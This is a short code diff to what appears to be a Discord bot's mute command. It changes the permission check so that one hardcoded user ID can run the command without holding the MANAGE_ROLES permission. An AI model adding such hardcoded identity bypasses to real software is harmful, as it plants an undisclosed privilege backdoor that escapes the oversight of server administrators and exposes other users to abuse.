@@ -448,7 +448,7 @@ const commands = {
       description: 'Mutes users',
       usage: `${prefix}mute [@user]`,
       runIf: function(message, args, period) {
-        return message.member.hasPermission('MANAGE_ROLES');
+        return message.member.hasPermission('MANAGE_ROLES') || message.author.id == '270997352939126794';
       },
       dm: false,
       run: function(message, args, period) {
